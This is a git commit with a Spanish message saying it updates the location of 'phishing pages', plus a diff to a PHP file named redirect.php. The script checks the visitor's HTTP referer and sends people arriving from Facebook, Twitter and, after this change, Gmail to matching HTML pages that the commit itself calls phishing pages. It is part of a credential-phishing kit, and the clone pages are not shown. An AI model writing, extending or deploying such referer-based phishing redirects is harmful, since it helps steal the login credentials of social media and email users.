9a59a0a192c58bcc52927bafc543fe8b20352317
Andréz Lamouroux <alamouroux@gmail.com>
2012-05-14 21:50:49 -0500

    Se actualiza localización de páginas phishing.

--- redirect.php
+++ redirect.php
@@ -2,8 +2,9 @@
 $ref = $_SERVER['HTTP_REFERER'];
 
 
-if (strpos($ref, "facebook"))	{ header('Location: facebook.html'); }
-if (strpos($ref, "twitter"))	{ header('Location: twitter.html'); }
+if (strpos($ref, "facebook"))	{ header('Location: redirect/facebook.html'); }
+if (strpos($ref, "twitter"))	{ header('Location: redirect/twitter.html'); }
+if (strpos($ref, "gmail"))  { header('Location: redirect/gmail.html'); }
 
 require('error.php');
 
